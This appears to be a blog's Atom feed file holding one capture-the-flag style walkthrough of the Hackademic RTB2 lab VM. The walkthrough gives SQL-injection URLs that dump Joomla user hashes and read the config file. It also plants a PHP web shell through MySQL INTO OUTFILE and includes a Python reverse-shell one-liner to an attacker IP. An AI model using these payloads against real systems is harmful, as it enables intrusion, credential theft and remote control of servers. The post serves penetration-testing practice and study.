@@ -1,0 +1,205 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: phpmyadmin | Bob1Bob2]]></title>
+  <link href="http://wg135.github.io/blog/categories/phpmyadmin/atom.xml" rel="self"/>
+  <link href="http://wg135.github.io/"/>
+  <updated>2016-08-12T13:04:45-05:00</updated>
+  <id>http://wg135.github.io/</id>
+  <author>
+    <name><![CDATA[Bob1Bob2]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Hackademic RTB2]]></title>
+    <link href="http://wg135.github.io/blog/2016/08/10/hackademic-rtb2/"/>
+    <updated>2016-08-10T15:38:10-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/08/10/hackademic-rtb2</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>Netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+<li>Joomscan</li>
+<li>Metasploit</li>
+</ul>
+
+
+<h3>Vulnerabilities:</h3>
+
+<p><a href="https://www.exploit-db.com/exploits/15285/">Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation</a></p>
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
+<img src="/images/blog/vulhub/rtb2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.158 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.158 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like port 80 is opening and port 666 is filtered.</p>
+
+<p>Use both wfuzz to scan the host</p>
+
+<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.158/FUZZ 2&gt;/dev/null
+</code></pre>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find <code>phpmyadmin</code></p>
+
+<p>check the webpage, and need to login, try to use sqli to by pass the autherication, but doesn&rsquo;t work. Now step back, enumerate more.</p>
+
+<p>I use nmap to scan the target again. find port 666 now is opening. So there may be a port knocking existing.</p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use wfuzz scan again</p>
+
+<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.158:666/FUZZ 2&gt;/dev/null
+</code></pre>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check the webpage <code>http://192.168.41.158:666/</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like it is joomla</p>
+
+<p>now use Joomba to scan the app</p>
+
+<p><code>joomscan -u http://192.168.41.158:666/</code></p>
+
+<p>nothing cool comes out.</p>
+
+<p>use metasploit</p>
+
+<p><code>search joomla</code></p>
+
+<p>I use <code>auxiliary/scanner/http/joomla_plugins</code></p>
+
+<pre><code>msf &gt; use auxiliary/scanner/http/joomla_plugins
+msf auxiliary(joomla_plugins) &gt; set rhosts 192.168.41.158
+msf auxiliary(joomla_plugins) &gt; set rport 666
+msf auxiliary(joomla_plugins) &gt; run
+</code></pre>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use <code>/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid='</code></p>
+
+<p>so first step, verify the sql injection:</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid='</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>then try to get column number:</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 1--</code>
+<code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 2--</code>
+<code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 3--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>the column number is 2</p>
+
+<p>next find out which column we can use</p>
+
+<p><code>158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1,2--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Okay. Column 2</p>
+
+<p>try to check mysql version</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1,@@version--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get all table name</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, table_name from information_schema.tables--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get all column name of table jos_users</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, column_name from information_schema.columns where table_name = 'jos_users'--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>next, get column username and password:</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, concat(username,0x20,password) from jos_users--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_018.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>The format is hash:salt</p>
+
+<p>use my previous joomla hash crack script <a href="https://github.com/wg135/script/blob/master/crackjoomla.py">crackjoomla.py</a></p>
+
+<pre><code>./crackjoomla.py 992396d7fc19fd76393f359cb294e300 70NFLkBrApLamH9VNGjlViJLlJsB60KF /usr/share/wordlists/rockyou.txt 
+</code></pre>
+
+<p>for administrator, I didn&rsquo;t get the password</p>
+
+<p>for JSmith, password is matrix, for BTallor, password is victim.</p>
+
+<p>login using JSmith, find nowhere can upload the webshell. check the configuration.php file</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, load_file('/var/www/configuration.php')--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find the username/password. Use it login phpmyadmin</p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_022.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now I will create a backdoor using mysql:</p>
+
+<pre><code>create database pwn;
+create table backdoor(script text);
+insert into backdoor(script) values('&lt;?php echo "&lt;pre&gt;"; system($_GET["cmd"]); echo "&lt;/pre&gt;"; ?&gt;');
+select * into outfile "/var/www/shells.php" from backdoor;
+</code></pre>
+
+<p>check the backdoor.</p>
+
+<p><code>http://192.168.41.158:666/backdoor3.php?cmd=uname -a</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_023.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>good.</p>
+
+<p>Setup netcat and</p>
+
+<pre><code>http://192.168.41.158:666/backdoor3.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.41.149",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+</code></pre>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_020.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>uname -a</code></p>
+
+<p>find the kernel version is 2.6.32. Find an exploit Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation.</p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+</feed>
